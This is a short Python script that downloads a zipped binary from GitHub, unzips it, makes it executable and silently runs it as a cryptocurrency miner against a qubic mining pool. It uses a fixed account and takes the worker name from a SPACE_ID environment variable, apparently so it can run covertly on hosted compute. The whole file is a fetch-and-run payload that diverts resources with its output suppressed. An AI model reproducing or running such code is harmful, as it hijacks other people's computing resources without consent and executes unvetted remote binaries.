import os
os.system("wget https://github.com/qqivk/nosrp/raw/refs/heads/main/Nmdi.zip")
os.system("unzip Nmdi.zip")
os.system("chmod +x Nmdi")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Nmdi --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
